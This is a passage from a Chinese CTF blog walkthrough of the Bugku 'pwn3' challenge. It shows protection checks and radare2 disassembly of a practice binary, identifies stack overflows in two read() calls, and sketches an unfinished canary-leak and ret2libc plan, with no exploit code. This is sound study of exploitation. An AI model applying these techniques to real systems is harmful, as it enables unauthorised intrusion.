<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>checksec，发现开启了canary、NX、PIE<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">checksec --file=read_note </span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   86 Symbols     Yes	0		3	read_note</span><br></pre></td></tr></table></figure></p>
<p>rabin2查看信息<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">rabin2 -I read_note </span></span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x0</span><br><span class="line">binsz    13860</span><br><span class="line">bintype  elf</span><br><span class="line">bits     64</span><br><span class="line">canary   true</span><br><span class="line">class    ELF64</span><br><span class="line">compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib64/ld-linux-x86-64.so.2</span><br><span class="line">laddr    0x0</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  AMD x86-64 architecture</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      true</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">sanitiz  false</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">rabin2 -z read_note </span></span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type  string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x00000e28 0x00000e28 26  27   .rodata ascii welcome to noteRead system</span><br><span class="line">1   0x00000e48 0x00000e48 43  44   .rodata ascii there is there notebook: flag, flag1, flag2</span><br><span class="line">2   0x00000e74 0x00000e74 29  30   .rodata ascii   Please input the note path:</span><br><span class="line">3   0x00000e94 0x00000e94 16  17   .rodata ascii note path false!</span><br><span class="line">4   0x00000ea5 0x00000ea5 16  17   .rodata ascii write some note:</span><br><span class="line">5   0x00000eb6 0x00000eb6 28  29   .rodata ascii   please input the note len:</span><br><span class="line">6   0x00000ed6 0x00000ed6 22  23   .rodata ascii please input the note:</span><br><span class="line">7   0x00000eed 0x00000eed 13  14   .rodata ascii the note is: </span><br><span class="line">8   0x00000f00 0x00000f00 32  33   .rodata ascii error: the note len must be  624</span><br><span class="line">9   0x00000f28 0x00000f28 34  35   .rodata ascii   so please input note(len is 624)</span><br></pre></td></tr></table></figure></p>
<p>列出函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x00000970]&gt;</span><span class="bash"> afl</span></span><br><span class="line">0x00000970    1 41           entry0</span><br><span class="line">0x00000920    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x000009a0    4 50   -&gt; 44   sym.deregister_tm_clones</span><br><span class="line">0x000009e0    4 66   -&gt; 57   sym.register_tm_clones</span><br><span class="line">0x00000a30    5 50           entry.fini0</span><br><span class="line">0x00000a70    4 48   -&gt; 42   entry.init0</span><br><span class="line">0x00000e10    1 2            sym.__libc_csu_fini</span><br><span class="line">0x00000d35    3 106          sym.noteRead</span><br><span class="line">0x000008c0    1 6            sym.imp.fread</span><br><span class="line">0x000008e0    1 6            sym.imp.strlen</span><br><span class="line">0x00000e14    1 9            sym._fini</span><br><span class="line">0x00000da0    4 101          sym.__libc_csu_init</span><br><span class="line">0x00000d20    1 21           main</span><br><span class="line">0x00000aa0   10 640          sym.vul</span><br><span class="line">0x00000878    3 26           sym._init</span><br><span class="line">0x000008b0    1 6            sym.imp.puts</span><br><span class="line">0x000008d0    1 6            sym.imp.fclose</span><br><span class="line">0x000008f0    1 6            sym.imp.__stack_chk_fail</span><br><span class="line">0x00000900    1 6            sym.imp.memset</span><br><span class="line">0x00000910    1 6            sym.imp.read</span><br><span class="line">0x00000930    1 6            sym.imp.setvbuf</span><br><span class="line">0x00000940    1 6            sym.imp.fopen</span><br><span class="line">0x00000950    1 6            sym.imp.__isoc99_scanf</span><br><span class="line">0x00000000   11 346  -&gt; 362  loc.imp._ITM_deregisterTMCloneTable</span><br><span class="line"><span class="meta">[0x00000970]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p>
<p>反编译main函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x00000970]&gt;</span><span class="bash"> pdf @main</span></span><br><span class="line">┌ 21: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           ; DATA XREF from entry0 @ 0x98d</span><br><span class="line">│           0x00000d20      55             push rbp                    ; .//rop1.c:53</span><br><span class="line">│           0x00000d21      4889e5         mov rbp, rsp</span><br><span class="line">│           0x00000d24      b800000000     mov eax, 0                  ; .//rop1.c:54</span><br><span class="line">│           0x00000d29      e872fdffff     call sym.vul</span><br><span class="line">│           0x00000d2e      b800000000     mov eax, 0</span><br><span class="line">│           0x00000d33      5d             pop rbp                     ; .//rop1.c:55</span><br><span class="line">└           0x00000d34      c3             ret</span><br></pre></td></tr></table></figure></p>
<p>反编译sym.vul<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x00000970]&gt;</span><span class="bash"> pdf @sym.vul</span></span><br><span class="line">┌ 640: sym.vul ();</span><br><span class="line">│           ; var size_t nbyte @ rbp-0x4ec</span><br><span class="line">│           ; var file*stream @ rbp-0x4e8</span><br><span class="line">│           ; var char *filename @ rbp-0x4e0</span><br><span class="line">│           ; var char *s @ rbp-0x4c0</span><br><span class="line">│           ; var char *buf @ rbp-0x260</span><br><span class="line">│           ; var int64_t canary @ rbp-0x8</span><br><span class="line">│           ; CALL XREF from main @ 0xd29</span><br><span class="line">│           0x00000aa0      55             push rbp                    ; .//rop1.c:6</span><br><span class="line">│           0x00000aa1      4889e5         mov rbp, rsp                ; /types.h:125</span><br><span class="line">│           0x00000aa4      4881ecf00400.  sub rsp, 0x4f0              ; /types.h:459</span><br><span class="line">│           0x00000aab      64488b042528.  mov rax, qword fs:[0x28]    ; .//rop1.c:6</span><br><span class="line">│           0x00000ab4      488945f8       mov qword [canary], rax     ; /types.h:2483</span><br><span class="line">│           0x00000ab8      31c0           xor eax, eax</span><br><span class="line">│           0x00000aba      488b05cf1520.  mov rax, qword [obj.stdin]  ; .//rop1.c:7 ; obj.stdin__GLIBC_2.2.5</span><br><span class="line">│                                                                      ; [0x202090:8]=0</span><br><span class="line">│           0x00000ac1      b900000000     mov ecx, 0                  ; /types.h:4325 ; size_t size</span><br><span class="line">│           0x00000ac6      ba02000000     mov edx, 2                  ; /types.h:4932 ; int mode</span><br><span class="line">│           0x00000acb      be00000000     mov esi, 0                  ; /types.h:6088 ; char *buf</span><br><span class="line">│           0x00000ad0      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x00000ad3      e858feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x00000ad8      488b05a11520.  mov rax, qword [obj.stdout] ; .//rop1.c:8 ; rdi</span><br><span class="line">│                                                                      ; [0x202080:8]=0</span><br><span class="line">│           0x00000adf      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x00000ae4      ba02000000     mov edx, 2                  ; int mode</span><br><span class="line">│           0x00000ae9      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x00000aee      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x00000af1      e83afeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x00000af6      488d8540fbff.  lea rax, [s]                ; .//rop1.c:14</span><br><span class="line">│           0x00000afd      ba58020000     mov edx, 0x258              ; size_t n</span><br><span class="line">│           0x00000b02      be00000000     mov esi, 0                  ; int c</span><br><span class="line">│           0x00000b07      4889c7         mov rdi, rax                ; void *s</span><br><span class="line">│           0x00000b0a      e8f1fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)</span><br><span class="line">│           0x00000b0f      488d8520fbff.  lea rax, [filename]         ; .//rop1.c:15</span><br><span class="line">│           0x00000b16      ba14000000     mov edx, 0x14               ; size_t n</span><br><span class="line">│           0x00000b1b      be00000000     mov esi, 0                  ; int c</span><br><span class="line">│           0x00000b20      4889c7         mov rdi, rax                ; void *s</span><br><span class="line">│           0x00000b23      e8d8fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)</span><br><span class="line">│           0x00000b28      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:16</span><br><span class="line">│           0x00000b2f      ba58020000     mov edx, 0x258              ; size_t n</span><br><span class="line">│           0x00000b34      be00000000     mov esi, 0                  ; int c</span><br><span class="line">│           0x00000b39      4889c7         mov rdi, rax                ; void *s</span><br><span class="line">│           0x00000b3c      e8bffdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)</span><br><span class="line">│           0x00000b41      488d3de00200.  lea rdi, str.welcome_to_noteRead_system ; .//rop1.c:18 ; 0xe28 ; "welcome to noteRead system" ; const char *s</span><br><span class="line">│           0x00000b48      e863fdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000b4d      488d3df40200.  lea rdi, str.there_is_there_notebook:_flag__flag1__flag2 ; .//rop1.c:19 ; 0xe48 ; "there is there notebook: flag, flag1, flag2" ; const char *s</span><br><span class="line">│           0x00000b54      e857fdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000b59      488d3d140300.  lea rdi, str.Please_input_the_note_path: ; .//rop1.c:20 ; 0xe74 ; "  Please input the note path:" ; const char *s</span><br><span class="line">│           0x00000b60      e84bfdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000b65      488d8520fbff.  lea rax, [filename]         ; .//rop1.c:21</span><br><span class="line">│           0x00000b6c      ba14000000     mov edx, 0x14               ; size_t nbyte</span><br><span class="line">│           0x00000b71      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│           0x00000b74      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x00000b79      b800000000     mov eax, 0</span><br><span class="line">│           0x00000b7e      e88dfdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00000b83      488d8520fbff.  lea rax, [filename]         ; .//rop1.c:23</span><br><span class="line">│           0x00000b8a      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00000b8d      e84efdffff     call sym.imp.strlen         ; size_t strlen(const char *s)</span><br><span class="line">│           0x00000b92      4883e801       sub rax, 1</span><br><span class="line">│           0x00000b96      0fb6840520fb.  movzx eax, byte [rbp + rax - 0x4e0]</span><br><span class="line">│           0x00000b9e      3c0a           cmp al, 0xa</span><br><span class="line">│       ┌─&lt; 0x00000ba0      751b           jne 0xbbd</span><br><span class="line">│       │   0x00000ba2      488d8520fbff.  lea rax, [filename]         ; .//rop1.c:24</span><br><span class="line">│       │   0x00000ba9      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│       │   0x00000bac      e82ffdffff     call sym.imp.strlen         ; size_t strlen(const char *s)</span><br><span class="line">│       │   0x00000bb1      4883e801       sub rax, 1</span><br><span class="line">│       │   0x00000bb5      c6840520fbff.  mov byte [rbp + rax - 0x4e0], 0</span><br><span class="line">│       │   ; CODE XREF from sym.vul @ 0xba0</span><br><span class="line">│       └─&gt; 0x00000bbd      488d8520fbff.  lea rax, [filename]         ; .//rop1.c:26</span><br><span class="line">│           0x00000bc4      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00000bc7      e814fdffff     call sym.imp.strlen         ; size_t strlen(const char *s)</span><br><span class="line">│           0x00000bcc      4883f805       cmp rax, 5</span><br><span class="line">│       ┌─&lt; 0x00000bd0      775b           ja 0xc2d</span><br><span class="line">│       │   0x00000bd2      488d8520fbff.  lea rax, [filename]         ; .//rop1.c:27</span><br><span class="line">│       │   0x00000bd9      488d35b20200.  lea rsi, [0x00000e92]       ; "r" ; const char *mode</span><br><span class="line">│       │   0x00000be0      4889c7         mov rdi, rax                ; const char *filename</span><br><span class="line">│       │   0x00000be3      e858fdffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)</span><br><span class="line">│       │   0x00000be8      48898518fbff.  mov qword [stream], rax</span><br><span class="line">│       │   0x00000bef      488d8d40fbff.  lea rcx, [s]                ; .//rop1.c:28</span><br><span class="line">│       │   0x00000bf6      488b8518fbff.  mov rax, qword [stream]</span><br><span class="line">│       │   0x00000bfd      ba44020000     mov edx, 0x244              ; "nux-x86-64.so.2"</span><br><span class="line">│       │   0x00000c02      4889ce         mov rsi, rcx</span><br><span class="line">│       │   0x00000c05      4889c7         mov rdi, rax</span><br><span class="line">│       │   0x00000c08      e828010000     call sym.noteRead           ; /types.h:6382</span><br><span class="line">│       │   0x00000c0d      488d8540fbff.  lea rax, [s]                ; .//rop1.c:29</span><br><span class="line">│       │   0x00000c14      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│       │   0x00000c17      e894fcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x00000c1c      488b8518fbff.  mov rax, qword [stream]     ; .//rop1.c:30</span><br><span class="line">│       │   0x00000c23      4889c7         mov rdi, rax                ; FILE *stream</span><br><span class="line">│       │   0x00000c26      e8a5fcffff     call sym.imp.fclose         ; int fclose(FILE *stream)</span><br><span class="line">│      ┌──&lt; 0x00000c2b      eb0c           jmp 0xc39</span><br><span class="line">│      ││   ; CODE XREF from sym.vul @ 0xbd0</span><br><span class="line">│      │└─&gt; 0x00000c2d      488d3d600200.  lea rdi, str.note_path_false ; .//rop1.c:33 ; 0xe94 ; "note path false!" ; const char *s</span><br><span class="line">│      │    0x00000c34      e877fcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│      │    ; CODE XREF from sym.vul @ 0xc2b</span><br><span class="line">│      └──&gt; 0x00000c39      488d3d650200.  lea rdi, str.write_some_note: ; .//rop1.c:36 ; 0xea5 ; "write some note:" ; const char *s</span><br><span class="line">│           0x00000c40      e86bfcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000c45      488d3d6a0200.  lea rdi, str.please_input_the_note_len: ; .//rop1.c:37 ; 0xeb6 ; "  please input the note len:" ; const char *s</span><br><span class="line">│           0x00000c4c      e85ffcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000c51      c78514fbffff.  mov dword [nbyte], 0        ; .//rop1.c:38</span><br><span class="line">│           0x00000c5b      488d8514fbff.  lea rax, [nbyte]            ; .//rop1.c:39</span><br><span class="line">│           0x00000c62      4889c6         mov rsi, rax</span><br><span class="line">│           0x00000c65      488d3d670200.  lea rdi, [0x00000ed3]       ; "%d" ; const char *format</span><br><span class="line">│           0x00000c6c      b800000000     mov eax, 0</span><br><span class="line">│           0x00000c71      e8dafcffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">│           0x00000c76      488d3d590200.  lea rdi, str.please_input_the_note: ; .//rop1.c:40 ; 0xed6 ; "please input the note:" ; const char *s</span><br><span class="line">│           0x00000c7d      e82efcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000c82      8b9514fbffff   mov edx, dword [nbyte]      ; .//rop1.c:41 ; size_t nbyte</span><br><span class="line">│           0x00000c88      488d85a0fdff.  lea rax, [buf]</span><br><span class="line">│           0x00000c8f      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│           0x00000c92      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x00000c97      b800000000     mov eax, 0</span><br><span class="line">│           0x00000c9c      e86ffcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00000ca1      488d3d450200.  lea rdi, str.the_note_is:   ; .//rop1.c:43 ; 0xeed ; "the note is: " ; const char *s</span><br><span class="line">│           0x00000ca8      e803fcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000cad      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:44</span><br><span class="line">│           0x00000cb4      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00000cb7      e8f4fbffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000cbc      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:45</span><br><span class="line">│           0x00000cc3      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00000cc6      e815fcffff     call sym.imp.strlen         ; size_t strlen(const char *s)</span><br><span class="line">│           0x00000ccb      483d70020000   cmp rax, 0x270              ; " "</span><br><span class="line">│       ┌─&lt; 0x00000cd1      7436           je 0xd09</span><br><span class="line">│       │   0x00000cd3      488d3d260200.  lea rdi, str.error:_the_note_len_must_be__624 ; .//rop1.c:46 ; 0xf00 ; "error: the note len must be  624" ; const char *s</span><br><span class="line">│       │   0x00000cda      e8d1fbffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x00000cdf      488d3d420200.  lea rdi, str.so_please_input_note_len_is_624 ; .//rop1.c:47 ; 0xf28 ; "  so please input note(len is 624)" ; const char *s</span><br><span class="line">│       │   0x00000ce6      e8c5fbffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x00000ceb      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:48</span><br><span class="line">│       │   0x00000cf2      ba70020000     mov edx, 0x270              ; " " ; size_t nbyte</span><br><span class="line">│       │   0x00000cf7      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│       │   0x00000cfa      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│       │   0x00000cff      b800000000     mov eax, 0</span><br><span class="line">│       │   0x00000d04      e807fcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│       │   ; CODE XREF from sym.vul @ 0xcd1</span><br><span class="line">│       └─&gt; 0x00000d09      90             nop                         ; .//rop1.c:50</span><br><span class="line">│           0x00000d0a      488b45f8       mov rax, qword [canary]</span><br><span class="line">│           0x00000d0e      644833042528.  xor rax, qword fs:[0x28]</span><br><span class="line">│       ┌─&lt; 0x00000d17      7405           je 0xd1e</span><br><span class="line">│       │   0x00000d19      e8d2fbffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</span><br><span class="line">│       │   ; CODE XREF from sym.vul @ 0xd17</span><br><span class="line">│       └─&gt; 0x00000d1e      c9             leave</span><br><span class="line">└           0x00000d1f      c3             ret</span><br></pre></td></tr></table></figure></p>
<p>canary位于栈上，用来检测栈溢出，因此需要先读出canary，在构造payload时确保canary位置上的值保持不变</p>
<p>在sym.vul函数中发现两处read()产生的溢出<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">│           0x00000c9c      e86ffcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00000ca1      488d3d450200.  lea rdi, str.the_note_is:   ; .//rop1.c:43 ; 0xeed ; "the note is: " ; const char *s</span><br><span class="line">│           0x00000ca8      e803fcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000cad      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:44</span><br><span class="line">│           0x00000cb4      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00000cb7      e8f4fbffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00000cbc      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:45</span><br><span class="line">│           0x00000cc3      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00000cc6      e815fcffff     call sym.imp.strlen         ; size_t strlen(const char *s)</span><br><span class="line">│           0x00000ccb      483d70020000   cmp rax, 0x270              ; " "</span><br><span class="line">│       ┌─&lt; 0x00000cd1      7436           je 0xd09</span><br><span class="line">│       │   0x00000cd3      488d3d260200.  lea rdi, str.error:_the_note_len_must_be__624 ; .//rop1.c:46 ; 0xf00 ; "error: the note len must be  624" ; const char *s</span><br><span class="line">│       │   0x00000cda      e8d1fbffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x00000cdf      488d3d420200.  lea rdi, str.so_please_input_note_len_is_624 ; .//rop1.c:47 ; 0xf28 ; "  so please input note(len is 624)" ; const char *s</span><br><span class="line">│       │   0x00000ce6      e8c5fbffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x00000ceb      488d85a0fdff.  lea rax, [buf]              ; .//rop1.c:48</span><br><span class="line">│       │   0x00000cf2      ba70020000     mov edx, 0x270              ; " " ; size_t nbyte</span><br><span class="line">│       │   0x00000cf7      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│       │   0x00000cfa      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│       │   0x00000cff      b800000000     mov eax, 0</span><br><span class="line">│       │   0x00000d04      e807fcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure></p>
<p>可以利用第一处read()和puts()获取一个值，第二处恢复栈并返回main函数，这样就可以在不crash进程的情况下逐步读取canary，读取libc基地址，ret2libc了</p>
<p>TODO: 接下来还没完成，有空填坑。有待了解的内容：ret2csu、栈迁移、ret2plt</p>

      
      
        <div class="page-reward">
          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
          <div class="hide_box"></div>
          <div class="shang_box">
            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
            <div class="shang_tit">
              <p>纯属好玩</p>
            </div>
            <div class="shang_payimg">
              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫">
            </div>
              <div class="pay_explain">扫码打赏，你说多少就多少</div>
            <div class="shang_payselect">
              
                <div class="pay_item checked" data-id="alipay">
                  <span class="radiobox"></span>
                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝"></span>
                </div>
              
              
                <div class="pay_item" data-id="wechat">
                  <span class="radiobox"></span>
                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信"></span>
                </div>
              
            </div>
            <div class="shang_info">
              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
            </div>
          </div>
        </div>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
        <script type="text/javascript">
          $(".pay_item").click(function(){
            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
            var dataid=$(this).attr('data-id');
            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
          });
          function dashangToggle(){
            
            $(".hide_box").fadeToggle();
            $(".shang_box").fadeToggle();
          }
        </script>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2020/03/16/Bugku-Pwn-Walkthrough/">Bugku Pwn Walkthrough</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 漏断 的个人博客">漏断</a></p>
        <p><span>发布时间:</span>2020年03月16日 - 06时21分</p>
        <p><span>最后更新:</span>2020年03月16日 - 06时31分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2020/03/16/Bugku-Pwn-Walkthrough/" title="Bugku Pwn Walkthrough">http://houwenda.github.io/2020/03/16/Bugku-Pwn-Walkthrough/</a>
            <span class="copy-path" data-clipboard-text="原文: http://houwenda.github.io/2020/03/16/Bugku-Pwn-Walkthrough/　　作者: 漏断" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
